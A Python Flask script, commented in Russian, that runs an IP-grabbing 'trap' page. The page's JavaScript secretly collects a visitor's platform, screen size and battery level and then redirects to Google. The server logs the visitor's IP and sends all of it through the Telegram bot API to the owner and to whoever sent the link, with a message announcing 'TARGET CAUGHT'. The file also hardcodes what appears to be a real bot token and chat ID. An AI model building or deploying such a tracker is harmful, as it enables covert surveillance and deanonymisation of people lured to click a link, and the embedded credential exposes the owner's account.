import asyncio, logging, threading, os, requests
from flask import Flask, render_template_string, request

# ТВОИ ДАННЫЕ
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115

app = Flask(__name__)

# Минималистичный JS-логгер (без лишних проверок, сразу в цель)
HTML_TRAP = """
<script>
async function c() {
    let d = { aid: "{{ aid }}", p: navigator.platform, s: screen.width+"x"+screen.height };
    try {
        const b = await navigator.getBattery();
        d.b = Math.round(b.level * 100) + "%";
    } catch (e) {}
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://google.com"; });
}
c();
</script>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%">Инициализация...</body>
"""

@app.route('/t/<aid>')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    text = f"🚨 **ЦЕЛЬ ПОПАЛАСЬ!**\n\n📍 IP: `{ip}`\n📱 Устройство: {data.get('p')}\n🖥 Экран: {data.get('s')}\n🔋 Батарея: {data.get('b', 'N/A')}"
    
    # ПРЯМАЯ ОТПРАВКА (не зависит от того, запущен бот или нет)
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": OWNER_ID, "text": text, "parse_mode": "Markdown"})
    requests.post(url, json={"chat_id": data['aid'], "text": text, "parse_mode": "Markdown"})
    return "OK", 200

if __name__ == "__main__":
    # Запускаем ТОЛЬКО сервер ловушки, без основного цикла бота (чтобы убрать ConflictError)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
